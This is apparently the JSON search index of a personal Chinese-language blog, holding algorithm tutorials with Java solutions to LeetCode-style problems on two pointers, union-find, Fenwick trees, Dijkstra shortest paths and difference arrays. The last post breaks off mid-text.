{"meta":{"title":"Elijah Zheng's Blog","subtitle":null,"description":"Elijah Zheng's Blog","author":"Elijah Zheng","url":"https://blog.zhengxiangling.com","root":"/"},"pages":[{"title":"Page","date":"2013-12-26T14:52:56.000Z","updated":"2023-11-17T14:27:30.012Z","comments":true,"path":"page/index.html","permalink":"https://blog.zhengxiangling.com/page/index.html","excerpt":"","text":"This is a page test."},{"title":"about","date":"2019-10-31T02:31:10.000Z","updated":"2023-11-17T14:27:30.012Z","comments":true,"path":"about/index.html","permalink":"https://blog.zhengxiangling.com/about/index.html","excerpt":"","text":"我Elijah Zheng, 开发工程师，喜欢编程、摄影、美食，家有一只布偶"},{"title":"tag","date":"2019-10-29T09:28:38.000Z","updated":"2023-11-17T14:27:30.013Z","comments":true,"path":"tags/index.html","permalink":"https://blog.zhengxiangling.com/tags/index.html","excerpt":"","text":""},{"title":"category","date":"2019-10-29T09:28:51.000Z","updated":"2023-11-17T14:27:30.012Z","comments":true,"path":"categories/index.html","permalink":"https://blog.zhengxiangling.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"左右指针，解接雨水等问题","slug":"左右指针，解接雨水等问题","date":"2023-11-19T06:34:00.000Z","updated":"2023-11-19T06:38:37.112Z","comments":true,"path":"2023/11/19/左右指针，解接雨水等问题/","link":"","permalink":"https://blog.zhengxiangling.com/2023/11/19/%E5%B7%A6%E5%8F%B3%E6%8C%87%E9%92%88%EF%BC%8C%E8%A7%A3%E6%8E%A5%E9%9B%A8%E6%B0%B4%E7%AD%89%E9%97%AE%E9%A2%98/","excerpt":"","text":"求解区间时，受左右两端的值影响，并向中间区域靠拢求值时可用。 11.盛最多水的容器 Problem: 11. 盛最多水的容器 给定一个长度为 n 的整数数组&nbsp;height&nbsp;。有&nbsp;n&nbsp;条垂线，第 i 条线的两个端点是&nbsp;(i, 0)&nbsp;和&nbsp;(i, height[i])&nbsp;。 找出其中的两条线，使得它们与&nbsp;x&nbsp;轴共同构成的容器可以容纳最多的水。 返回容器可以储存的最大水量。 说明：你不能倾斜容器。 示例 1： 输入：[1,8,6,2,5,4,8,3,7] 输出：49 解释：图中垂直线代表输入数组 [1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为&nbsp;49。 示例 2： 输入：height = [1,1] 输出：1 提示： n == height.length 2 &lt;= n &lt;= 105 0 &lt;= height[i] &lt;= 104 思路 接雨水plus，面积由左右两条线和j - i 围成的面积决定，而改变左右两条线怎么改变需要一些思考归纳。 解题方法 左右两条线怎么决定移动哪一条，可以解释为：移动最大的线，可能导致找不到最多水的容器，如果移动最小的线，可能会找到更大的容器，所以双指针每次移动的都是最小的那条线。 复杂度 时间复杂度: $O(n)$ 空间复杂度: $O(1)$ Code 12345678910111213141516171819202122class Solution &#123; public int maxArea(int[] height) &#123; // 状态由左右两条线 和 宽度(j - i) 决定 // 左右两条线，能盛水的大小由短边决定 // 那么左右两条线怎么决定移动哪一条，可以解释为：移动最大的线，可能导致找不到最多水的容器，如果移动最小的线，可能会找到更大的容器 int n = height.length; int l = 0, r = n - 1; int ans = 0; while(l &lt; r) &#123; int area = Math.min(height[l], height[r]) * (r - l); ans = Math.max(ans, area); if (height[l] &lt; height[r]) &#123; l ++; &#125; else &#123; r --; &#125; &#125; return ans; &#125;&#125;","categories":[{"name":"计算机算法","slug":"计算机算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"},{"name":"双指针","slug":"计算机算法/双指针","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%8F%8C%E6%8C%87%E9%92%88/"}],"tags":[],"author":"Elijah Zheng"},{"title":"并查集，求连通分量和拓扑排序等问题","slug":"并查集，求连通分量和拓扑排序等问题","date":"2023-11-19T06:25:00.000Z","updated":"2023-11-19T06:30:30.684Z","comments":true,"path":"2023/11/19/并查集，求连通分量和拓扑排序等问题/","link":"","permalink":"https://blog.zhengxiangling.com/2023/11/19/%E5%B9%B6%E6%9F%A5%E9%9B%86%EF%BC%8C%E6%B1%82%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F%E5%92%8C%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F%E7%AD%89%E9%97%AE%E9%A2%98/","excerpt":"图，求连通分量，判断点与点是否连通，求拓扑排序等问题，可以使用并查集去解决问题。","text":"图，求连通分量，判断点与点是否连通，求拓扑排序等问题，可以使用并查集去解决问题。 并查集模板12345678910111213141516171819202122232425262728293031class UF &#123; private int[] parent; private int count; public UF(int n) &#123; count = n; parent = new int[n]; for (int i = 0; i &lt; n; i++) &#123; parent[i] = i; &#125; &#125; public int find(int x) &#123; if (parent[x] != x) &#123; parent[x] = find(parent[x]); &#125; return parent[x]; &#125; public void union(int p, int q) &#123; int rootP = find(p); int rootQ = find(q); if (rootP == rootQ) &#123; return; &#125; parent[rootQ] = rootP; count --; &#125; public boolean connect(int p, int q) &#123; return find(p) == find(q); &#125;&#125; 684.冗余连接 Problem: 684. 冗余连接 树可以看成是一个连通且 无环&nbsp;的&nbsp;无向&nbsp;图。 给定往一棵&nbsp;n 个节点 (节点值&nbsp;1～n) 的树中添加一条边后的图。添加的边的两个顶点包含在 1 到 n&nbsp;中间，且这条附加的边不属于树中已存在的边。图的信息记录于长度为 n 的二维数组 edges&nbsp;，edges[i] = [ai, bi]&nbsp;表示图中在 ai 和 bi 之间存在一条边。 请找出一条可以删去的边，删除后可使得剩余部分是一个有着 n 个节点的树。如果有多个答案，则返回数组&nbsp;edges&nbsp;中最后出现的那个。 示例 1： 输入: edges = [[1,2], [1,3], [2,3]] 输出: [2,3] 示例 2： 输入: edges = [[1,2], [2,3], [3,4], [1,4], [1,5]] 输出: [1,4] 提示: n == edges.length 3 &lt;= n &lt;= 1000 edges[i].length == 2 1 &lt;= ai&nbsp;&lt; bi&nbsp;&lt;= edges.length ai != bi edges 中无重复元素 给定的图是连通的&nbsp; 思路 题目的题意一开始的图就是一个连通图，那么求可以删除的最后一条边，即所有给出的边连接成一个连通图有哪条边是多余的可以不拿来连接。 解题方法 把给出的边拿来做并查集构建连通图，如果哪条边是多余的（即connect为true），并且求是最后一个connect 为true，即为答案。 复杂度 时间复杂度: 循环n个点$O(n)$，并查集$O(logn)$，时间复杂度共$O(nlogn)$ 空间复杂度: $O(n)$ Code 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class Solution &#123; public int[] findRedundantConnection(int[][] edges) &#123; int n = edges.length; UF graph = new UF(n); int[] ans = new int[2]; for (int[] edge: edges) &#123; int a = edge[0] - 1; int b = edge[1] - 1; // System.out.println(graph.connect(a, b)); if (graph.connect(a, b)) &#123; ans = new int[]&#123;a + 1, b + 1&#125;; &#125; else &#123; graph.union(a, b); &#125; &#125; return ans; &#125;&#125;class UF &#123; private int[] parent; private int count; public UF(int n) &#123; count = n; parent = new int[n]; for (int i = 0; i &lt; n; i++) &#123; parent[i] = i; &#125; &#125; public int find(int x) &#123; if (parent[x] != x) &#123; parent[x] = find(parent[x]); &#125; return parent[x]; &#125; public void union(int p, int q) &#123; int rootP = find(p); int rootQ = find(q); if (rootP == rootQ) &#123; return; &#125; parent[rootQ] = rootP; count --; &#125; public boolean connect(int p, int q) &#123; return find(p) == find(q); &#125;&#125;","categories":[{"name":"计算机算法","slug":"计算机算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"},{"name":"并查集","slug":"计算机算法/并查集","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%B9%B6%E6%9F%A5%E9%9B%86/"}],"tags":[],"author":"Elijah Zheng"},{"title":"树状数组，用于快速求解范围区间的和","slug":"树状数组，用于快速求解范围区间内的值","date":"2023-11-19T05:28:00.000Z","updated":"2023-11-19T06:22:58.803Z","comments":true,"path":"2023/11/19/树状数组，用于快速求解范围区间内的值/","link":"","permalink":"https://blog.zhengxiangling.com/2023/11/19/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%BF%AB%E9%80%9F%E6%B1%82%E8%A7%A3%E8%8C%83%E5%9B%B4%E5%8C%BA%E9%97%B4%E5%86%85%E7%9A%84%E5%80%BC/","excerpt":"求解数组区间的和，有前缀和、差分数组、树状数组，但各所适用的场景不用。 前缀和适用于数组的值一开始固定不变的情况； 差分数组适用于数组的值会改变（增加|删除），但是求解原数据时需要恢复数据； 树状数组适用数组的值会改变，还可以快速求解一段区间的和，但需要构建数据结构。","text":"求解数组区间的和，有前缀和、差分数组、树状数组，但各所适用的场景不用。 前缀和适用于数组的值一开始固定不变的情况； 差分数组适用于数组的值会改变（增加|删除），但是求解原数据时需要恢复数据； 树状数组适用数组的值会改变，还可以快速求解一段区间的和，但需要构建数据结构。 树状数组模板包括建树、查询区间值等。 1234567891011121314151617181920212223242526272829// 直接上树状数组的结构int[] tree;int[] num;int len;public int lowbit(int x) &#123; return x &amp; (-x);&#125;public void add(int index, int val) &#123; while(index &lt; len) &#123; tree[index] += val; index += lowbit(index); &#125;&#125;public int query(int index) &#123; int sum = 0; while (index &gt; 0) &#123; sum += tree[index]; index -= lowbit(index); &#125; return sum;&#125;public NumArray(int[] nums) &#123; num = nums; len = nums.length + 1; // 树状数组下标从1开始 tree = new int[len]; for (int i = 0; i &lt; nums.length; i++) &#123; add(i + 1, nums[i]); &#125;&#125; 307.区域和检索 - 数组可修改（中等） Problem: 307. 区域和检索 - 数组可修改 给你一个数组 nums ，请你完成两类查询。 其中一类查询要求 更新 数组&nbsp;nums&nbsp;下标对应的值 另一类查询要求返回数组&nbsp;nums&nbsp;中索引&nbsp;left&nbsp;和索引&nbsp;right&nbsp;之间（&nbsp;包含&nbsp;）的nums元素的 和&nbsp;，其中&nbsp;left &lt;= right 实现 NumArray 类： NumArray(int[] nums) 用整数数组 nums 初始化对象 void update(int index, int val) 将 nums[index] 的值 更新 为 val int sumRange(int left, int right) 返回数组&nbsp;nums&nbsp;中索引&nbsp;left&nbsp;和索引&nbsp;right&nbsp;之间（&nbsp;包含&nbsp;）的nums元素的 和&nbsp;（即，nums[left] + nums[left + 1], ..., nums[right]） 示例 1： 输入： [\"NumArray\", \"sumRange\", \"update\", \"sumRange\"] [[[1, 3, 5]], [0, 2], [1, 2], [0, 2]] 输出： [null, 9, null, 8] 解释： NumArray numArray = new NumArray([1, 3, 5]); numArray.sumRange(0, 2); // 返回 1 + 3 + 5 = 9 numArray.update(1, 2); // nums = [1,2,5] numArray.sumRange(0, 2); // 返回 1 + 2 + 5 = 8 &nbsp; 1 &lt;= nums.length &lt;= 3 *&nbsp;104 -100 &lt;= nums[i] &lt;= 100 0 &lt;= index &lt; nums.length -100 &lt;= val &lt;= 100 0 &lt;= left &lt;= right &lt; nums.length 调用 update 和 sumRange 方法次数不大于&nbsp;3 * 104&nbsp; 思路 本题需要对数组区间求和，并且需要频繁修改数组中的值，排除前缀和，可以使用树状数组和线段树，但是能用树状数组优先使用树状数组，实现起来会更方便。 解题方法 直接上树状数组结构，然后放入实现类中即可。 复杂度 时间复杂度: $O(logn)$ 空间复杂度: $O(n)$ Code 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849class NumArray &#123; // 区间求和，如果数组的值不变，可以直接用前缀和，这里需要update数组内的单个值，可以优先考虑用树状数组实现比较简单，但是也可以用线段树 // 直接上树状数组的结构 int[] tree; int[] num; int len; public int lowbit(int x) &#123; return x &amp; (-x); &#125; public void add(int index, int val) &#123; while(index &lt; len) &#123; tree[index] += val; index += lowbit(index); &#125; &#125; public int query(int index) &#123; int sum = 0; while (index &gt; 0) &#123; sum += tree[index]; index -= lowbit(index); &#125; return sum; &#125; public NumArray(int[] nums) &#123; num = nums; len = nums.length + 1; // 树状数组下标从1开始 tree = new int[len]; for (int i = 0; i &lt; nums.length; i++) &#123; add(i + 1, nums[i]); &#125; &#125; public void update(int index, int val) &#123; // 计算需要更改的值为 val - num[index] add(index + 1, val - num[index]); num[index] = val; &#125; public int sumRange(int left, int right) &#123; return query(right + 1) - query(left); &#125;&#125;/** * Your NumArray object will be instantiated and called as such: * NumArray obj = new NumArray(nums); * obj.update(index,val); * int param_2 = obj.sumRange(left,right); */ 1893.检查是否区域内所有整数都被覆盖（简单） Problem: 1893. 检查是否区域内所有整数都被覆盖 给你一个二维整数数组&nbsp;ranges&nbsp;和两个整数&nbsp;left&nbsp;和&nbsp;right&nbsp;。每个&nbsp;ranges[i] = [starti, endi]&nbsp;表示一个从&nbsp;starti&nbsp;到&nbsp;endi&nbsp;的&nbsp;闭区间&nbsp;。 如果闭区间&nbsp;[left, right]&nbsp;内每个整数都被&nbsp;ranges&nbsp;中&nbsp;至少一个&nbsp;区间覆盖，那么请你返回&nbsp;true&nbsp;，否则返回&nbsp;false&nbsp;。 已知区间 ranges[i] = [starti, endi] ，如果整数 x 满足 starti &lt;= x &lt;= endi&nbsp;，那么我们称整数x&nbsp;被覆盖了。 示例 1： 输入：ranges = [[1,2],[3,4],[5,6]], left = 2, right = 5 输出：true 解释：2 到 5 的每个整数都被覆盖了： - 2 被第一个区间覆盖。 - 3 和 4 被第二个区间覆盖。 - 5 被第三个区间覆盖。 示例 2： 输入：ranges = [[1,10],[10,20]], left = 21, right = 21 输出：false 解释：21 没有被任何一个区间覆盖。 提示： 1 &lt;= ranges.length &lt;= 50 1 &lt;= starti &lt;= endi &lt;= 50 1 &lt;= left &lt;= right &lt;= 50 思路 可以把两个整数 left 和 right的区间[left, right]分别拆开看做每个单独的区间[i]，取[i]在ranges区间的值是否不等于0，如果不等于0则说明ranges已覆盖。 解题方法 套用树状数组，对ranges里的区间range [i…j],都初始化到树状数组中，固定 add 值 1，query查询时，然后判断值是否为0。 复杂度 时间复杂度: 建树的时间复杂度：跟ranges和里面的range长度、lowbit的时间有关，n最大为50，最大的时间复杂度为$O(nnlogC)$；查询query的时间复杂度为$O(nlogC)$ 空间复杂度: $O(C)$ Code 123456789101112131415161718192021222324252627282930313233343536373839class Solution &#123; // 用树状数组解答，查询区间内是否有值 int[] tree; int len; public boolean isCovered(int[][] ranges, int left, int right) &#123; len = 51; tree = new int[len]; // 建树 for(int[] range: ranges) &#123; int lr = range[0], rr = range[1]; while(lr &lt;= rr) &#123; add(lr, 1); lr++; &#125; &#125; for(int i = left; i &lt;= right; i++) &#123; if (query(i) - query(i -1) == 0) return false; &#125; return true; &#125; public int lowbit(int x) &#123; return x &amp; -x; &#125; public void add(int index, int val) &#123; while(index &lt; len) &#123; tree[index] += 1; index += lowbit(index); &#125; &#125; public int query(int x) &#123; int sum = 0; while(x &gt; 0) &#123; sum += tree[x]; x -= lowbit(x); &#125; return sum; &#125;&#125;","categories":[{"name":"计算机算法","slug":"计算机算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"},{"name":"树状数组","slug":"计算机算法/树状数组","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"}],"tags":[],"author":"Elijah Zheng"},{"title":"dijkstra，解带权重的最短路径问题（图）","slug":"dijkstra，解最短路径问题","date":"2023-11-18T12:42:00.000Z","updated":"2023-11-19T05:24:24.121Z","comments":true,"path":"2023/11/18/dijkstra，解最短路径问题/","link":"","permalink":"https://blog.zhengxiangling.com/2023/11/18/dijkstra%EF%BC%8C%E8%A7%A3%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/","excerpt":"题目给出的条件为：图、路径有权值、权重无负数、求路径长度最值，可以使用 dijkstra 求 出发点 到其他点的 最短路径，记住dijkstra算法模板，直接套上用，构建一个 State类记录点的id和记录的最短路径长度，然后核心是最小堆，结合BFS遍历。","text":"题目给出的条件为：图、路径有权值、权重无负数、求路径长度最值，可以使用 dijkstra 求 出发点 到其他点的 最短路径，记住dijkstra算法模板，直接套上用，构建一个 State类记录点的id和记录的最短路径长度，然后核心是最小堆，结合BFS遍历。 1334.阈值距离内邻居最少的城市 Problem: 1334. 阈值距离内邻居最少的城市 题目(点击展开) 有 n&nbsp;个城市，按从 0 到 n-1&nbsp;编号。给你一个边数组&nbsp;edges，其中 edges[i] = [fromi, toi, weighti]&nbsp;代表&nbsp;fromi&nbsp;和&nbsp;toi&nbsp;两个城市之间的双向加权边，距离阈值是一个整数&nbsp;distanceThreshold。 返回能通过某些路径到达其他城市数目最少、且路径距离 最大 为&nbsp;distanceThreshold&nbsp;的城市。如果有多个这样的城市，则返回编号最大的城市。 注意，连接城市 i 和 j 的路径的距离等于沿该路径的所有边的权重之和。 示例 1： 输入：n = 4, edges = [[0,1,3],[1,2,1],[1,3,4],[2,3,1]], distanceThreshold = 4 输出：3 解释：城市分布图如上。 每个城市阈值距离 distanceThreshold = 4 内的邻居城市分别是： 城市 0 -&gt; [城市 1, 城市 2]&nbsp; 城市 1 -&gt; [城市 0, 城市 2, 城市 3]&nbsp; 城市 2 -&gt; [城市 0, 城市 1, 城市 3]&nbsp; 城市 3 -&gt; [城市 1, 城市 2]&nbsp; 城市 0 和 3 在阈值距离 4 以内都有 2 个邻居城市，但是我们必须返回城市 3，因为它的编号最大。 示例 2： 输入：n = 5, edges = [[0,1,2],[0,4,8],[1,2,3],[1,4,2],[2,3,1],[3,4,1]], distanceThreshold = 2 输出：0 解释：城市分布图如上。&nbsp; 每个城市阈值距离 distanceThreshold = 2 内的邻居城市分别是： 城市 0 -&gt; [城市 1]&nbsp; 城市 1 -&gt; [城市 0, 城市 4]&nbsp; 城市 2 -&gt; [城市 3, 城市 4]&nbsp; 城市 3 -&gt; [城市 2, 城市 4] 城市 4 -&gt; [城市 1, 城市 2, 城市 3]&nbsp; 城市 0 在阈值距离 2 以内只有 1 个邻居城市。 提示： 2 &lt;= n &lt;= 100 1 &lt;= edges.length &lt;= n * (n - 1) / 2 edges[i].length == 3 0 &lt;= fromi &lt; toi &lt; n 1 &lt;= weighti,&nbsp;distanceThreshold &lt;= 10^4 所有 (fromi, toi)&nbsp;都是不同的。 思路 图，有权值，权重无负数，求路径长度，可以使用dijkstra求出发点到其他点的最短路径。 解题方法 核心数据结构为求起点到不超过阈值的最短路径，然后遍历所有的点，求最短路径的长度，题目为求最后一个路径长度最短的点，遍历找到即可。 复杂度 时间复杂度: $O(nlogn)$ 空间复杂度: 添加空间复杂度, 示例： $O(n+m)$ Code 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667class Solution &#123; int max; boolean[] visited; public int findTheCity(int n, int[][] edges, int distanceThreshold) &#123; max = distanceThreshold; visited = new boolean[n]; List&lt;int[]&gt;[] graph = new LinkedList[n]; for(int i = 0; i &lt; n; i++) &#123; graph[i] = new LinkedList&lt;&gt;(); &#125; // 构造图 for(int[] edge: edges) &#123; int from = edge[0]; int to = edge[1]; int w = edge[2]; graph[from].add(new int[]&#123;to, w&#125;); graph[to].add(new int[]&#123;from, w&#125;); &#125; int ans = -1, cnt = n + 1; for(int i = 0; i &lt; n; i++) &#123; // 对每个点都做dijkstra int[] dist = dijkstra(i, graph); int cur = 0; for (int j = 0; j &lt; n; j++) &#123; if(i != j &amp;&amp; dist[j] &lt;= max) cur++; &#125; if (cur &lt;= cnt) &#123; cnt = cur; ans = i; &#125; &#125; return ans; &#125; public int[] dijkstra(int start, List&lt;int[]&gt;[] graph) &#123; int[] dist = new int[graph.length]; Arrays.fill(dist, Integer.MAX_VALUE); dist[start] = 0; visited[start] = true; Queue&lt;State&gt; pq = new PriorityQueue&lt;&gt;((a, b) -&gt; &#123; return a.distance - b.distance; &#125;); pq.offer(new State(start, 0)); while(!pq.isEmpty()) &#123; State cur = pq.poll(); int curId = cur.id; int curDistance = cur.distance; if (curDistance &gt; dist[curId] || curDistance &gt; max) continue; for(int[] neighbor: graph[curId]) &#123; int nextId = neighbor[0]; int nextW = dist[curId] + neighbor[1]; if (dist[nextId] &gt; nextW) &#123; dist[nextId] = nextW; pq.offer(new State(nextId, nextW)); &#125; &#125; &#125; return dist; &#125;&#125;class State &#123; int id; int distance; public State(int _id, int _distance) &#123; this.id = _id; this.distance = _distance; &#125;&#125; 787.K 站中转内最便宜的航班 Problem: 787. K 站中转内最便宜的航班 有 n 个城市通过一些航班连接。给你一个数组&nbsp;flights ，其中&nbsp;flights[i] = [fromi, toi, pricei] ，表示该航班都从城市 fromi 开始，以价格 pricei 抵达 toi。 现在给定所有的城市和航班，以及出发城市 src 和目的地 dst，你的任务是找到出一条最多经过 k&nbsp;站中转的路线，使得从 src 到 dst 的 价格最便宜 ，并返回该价格。 如果不存在这样的路线，则输出 -1。 示例 1： 输入: n = 3, edges = [[0,1,100],[1,2,100],[0,2,500]] src = 0, dst = 2, k = 1 输出: 200 解释: 城市航班图如下 从城市 0 到城市 2 在 1 站中转以内的最便宜价格是 200，如图中红色所示。 示例 2： 输入: n = 3, edges = [[0,1,100],[1,2,100],[0,2,500]] src = 0, dst = 2, k = 0 输出: 500 解释: 城市航班图如下 从城市 0 到城市 2 在 0 站中转以内的最便宜价格是 500，如图中蓝色所示。 提示： 1 &lt;= n &lt;= 100 0 &lt;= flights.length &lt;= (n * (n - 1) / 2) flights[i].length == 3 0 &lt;= fromi, toi &lt; n fromi != toi 1 &lt;= pricei &lt;= 104 航班没有重复，且不存在自环 0 &lt;= src, dst, k &lt; n src != dst 思路 图，带权值，没有负值，求起点和终点的最短路径，可以使用dijkstra。 解题方法 本题的难点在：求中转航班时，可能会出现死胡同而排除掉正确的答案，比如用例n=5，flights=[[0,1,5],[1,2,5],[0,3,2],[3,1,2],[1,4,1],[4,2,1]]，src =0，dst=2,如果用默认的dijkstra框架，遇到 curW &gt; dist[curId]就剪枝，会把正确答案给排除掉，比如到终点的路径应该是0-1-4-2得7，而返回的却是0-3-1-2得9，在dist[1]&#x3D;4已经把[0,1,5]这个航班剪掉了，所以我们要用可以中转航班次数来作为剪枝条件，把 curW &gt; dist[curId] 改为 curK &lt; 0，然后如果遇到还有中转次数时，也要把该点入堆。 Code 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364class Solution &#123; public int findCheapestPrice(int n, int[][] flights, int src, int dst, int k) &#123; List&lt;int[]&gt;[] graph = new LinkedList[n]; for(int i = 0; i &lt; n; i++) &#123; graph[i] = new LinkedList&lt;&gt;(); &#125; for(int[] flight: flights) &#123; int from = flight[0]; int to = flight[1]; int w = flight[2]; graph[from].add(new int[]&#123;to, w&#125;); &#125; int[] dist = dijkstra(graph, src, dst, k); return dist[dst] != Integer.MAX_VALUE ? dist[dst] : -1; &#125; public int[] dijkstra(List&lt;int[]&gt;[] graph, int src, int dst, int k) &#123; Queue&lt;State&gt; pq = new PriorityQueue&lt;&gt;((a, b) -&gt; &#123; return a.distance - b.distance; &#125;); pq.offer(new State(src, 0, k)); int[] dist = new int[graph.length]; int[] stop = new int[graph.length]; Arrays.fill(dist, Integer.MAX_VALUE); while(!pq.isEmpty()) &#123; State cur = pq.poll(); int curId = cur.id; int curW = cur.distance; int curK = cur.k; // System.out.println(curId + &quot;,&quot; + curW + &quot;,&quot; + curDeep); if (curId == dst) &#123; return dist; &#125; if (curK &lt; 0) &#123; continue; &#125; for(int[] neighbor: graph[curId]) &#123; int nextId = neighbor[0]; int nextW = curW + neighbor[1]; int nextK = curK - 1; if (dist[nextId] &gt; nextW) &#123; dist[nextId] = nextW; pq.offer(new State(nextId, nextW, nextK)); stop[nextId] = nextK; &#125; else if (stop[nextId] &lt; nextK) &#123; pq.offer(new State(nextId, nextW, nextK)); &#125; &#125; &#125; return dist; &#125;&#125;class State &#123; int id; int distance; int k; public State(int _id, int _distance, int _k) &#123; this.id = _id; this.distance = _distance; this.k = _k; &#125;&#125; 882. 细分图中的可到达节点 Problem: 882. 细分图中的可到达节点 给你一个无向图（原始图），图中有 n 个节点，编号从 0 到 n - 1 。你决定将图中的每条边 细分 为一条节点链，每条边之间的新节点数各不相同。 图用由边组成的二维数组 edges 表示，其中&nbsp;edges[i] = [ui, vi, cnti] 表示原始图中节点&nbsp;ui 和&nbsp;vi 之间存在一条边，cnti 是将边 细分 后的新节点总数。注意，cnti == 0 表示边不可细分。 要 细分 边 [ui, vi] ，需要将其替换为 (cnti + 1) 条新边，和&nbsp;cnti 个新节点。新节点为 x1, x2, ..., xcnti ，新边为 [ui, x1], [x1, x2], [x2, x3], ..., [xcnti-1, xcnti], [xcnti, vi] 。 现在得到一个&nbsp;新的细分图 ，请你计算从节点 0 出发，可以到达多少个节点？如果节点间距离是 maxMoves 或更少，则视为 可以到达 。 给你原始图和 maxMoves ，返回 新的细分图中从节点 0 出发 可到达的节点数&nbsp;。 示例 1： 输入：edges = [[0,1,10],[0,2,1],[1,2,2]], maxMoves = 6, n = 3 输出：13 解释：边的细分情况如上图所示。 可以到达的节点已经用黄色标注出来。 示例 2： 输入：edges = [[0,1,4],[1,2,6],[0,2,8],[1,3,1]], maxMoves = 10, n = 4 输出：23 示例 3： 输入：edges = [[1,2,4],[1,4,5],[1,3,1],[2,3,4],[3,4,5]], maxMoves = 17, n = 5 输出：1 解释：节点 0 与图的其余部分没有连通，所以只有节点 0 可以到达。 提示： 0 &lt;= edges.length &lt;= min(n * (n - 1) / 2, 104) edges[i].length == 3 0 &lt;= ui &lt; vi &lt; n 图中 不存在平行边 0 &lt;= cnti &lt;= 104 0 &lt;= maxMoves &lt;= 109 1 &lt;= n &lt;= 3000 思路 这是最短路径的变种题，在求不超过阈值的范围内的最短路径，还要新加一层判断不能到的地方还能多走几步 解题方法 核心算法dijkstra不需要变，但是需要改变一下题目所给的权重，因为权重仅包含中间出现的节点，未包含上一个图的节点，所以初始化图的时候 w 需要 +1。 然后核心的关键在于求所有的节点：所有的总数 &#x3D; maxMoves步数内能到达的点的个数 + 中间的还有几个节点可以走 Code 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667class Solution &#123; public int reachableNodes(int[][] edges, int maxMoves, int n) &#123; // 求最短路径的变种题，新加一层判断不能到的地方还能多走几步 List&lt;int[]&gt;[] graph = new LinkedList[n]; for(int i = 0; i &lt; n; i++) &#123; graph[i] = new LinkedList&lt;&gt;(); &#125; for(int[] edge: edges) &#123; int from = edge[0]; int to = edge[1]; int w = edge[2] + 1; // +1 代表中间的节点数加上上一个位置的节点 graph[from].add(new int[]&#123;to, w&#125;); graph[to].add(new int[]&#123;from, w&#125;); &#125; int[] dist = dijkstra(graph, 0); int ans = 0; // 先求maxMoves步数内能到达的点的个数 for(int i = 0; i &lt; n; i++) &#123; if (dist[i] &lt;= maxMoves) &#123; ans ++; &#125; &#125; // ** 再求中间的还有几个节点可以走 for(int[] edge: edges) &#123; int from = edge[0]; int to = edge[1]; int w = edge[2]; int a = Math.max(maxMoves - dist[from], 0); int b = Math.max(maxMoves - dist[to], 0); ans += Math.min(a + b, w); &#125; return ans; &#125; public int[] dijkstra(List&lt;int[]&gt;[] graph, int start) &#123; int[] dist = new int[graph.length]; Arrays.fill(dist, Integer.MAX_VALUE); Queue&lt;State&gt; pq = new PriorityQueue&lt;&gt;((a, b) -&gt; &#123; return a.dis - b.dis; &#125;); dist[start] = 0; pq.offer(new State(start, 0)); while(!pq.isEmpty()) &#123; State cur = pq.poll(); int curId = cur.id; int curW = cur.dis; if (curW &gt; dist[curId]) continue; for(int[] neighbor: graph[curId]) &#123; int nextId = neighbor[0]; int nextW = neighbor[1] + curW; if (dist[nextId] &gt; nextW) &#123; dist[nextId] = nextW; pq.offer(new State(nextId, nextW)); &#125; &#125; &#125; return dist; &#125;&#125;class State &#123; int id; int dis; public State(int _id, int _dis) &#123; this.id = _id; this.dis = _dis; &#125;&#125;","categories":[{"name":"计算机算法","slug":"计算机算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"},{"name":"最短路径","slug":"计算机算法/最短路径","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"}],"tags":[],"author":"Elijah Zheng"},{"title":"差分数组，解频繁增减的求和问题","slug":"差分数组，解频繁增减的求和问题","date":"2023-11-18T12:28:00.000Z","updated":"2023-11-18T12:37:45.941Z","comments":true,"path":"2023/11/18/差分数组，解频繁增减的求和问题/","link":"","permalink":"https://blog.zhengxiangling.com/2023/11/18/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84%EF%BC%8C%E8%A7%A3%E9%A2%91%E7%B9%81%E5%A2%9E%E5%87%8F%E7%9A%84%E6%B1%82%E5%92%8C%E9%97%AE%E9%A2%98/","excerpt":"当题目给出的数据不是很大，需要快速求解数组区间的和，并且频繁的对数组内的值增加和减掉，可以考虑用差分数组来实现快速求区间值。","text":"当题目给出的数据不是很大，需要快速求解数组区间的和，并且频繁的对数组内的值增加和减掉，可以考虑用差分数组来实现快速求区间值。 1094.拼车 Problem: 1094. 拼车 车上最初有&nbsp;capacity&nbsp;个空座位。车&nbsp;只能&nbsp;向一个方向行驶（也就是说，不允许掉头或改变方向） 给定整数&nbsp;capacity&nbsp;和一个数组 trips , &nbsp;trip[i] = [numPassengersi, fromi, toi]&nbsp;表示第 i 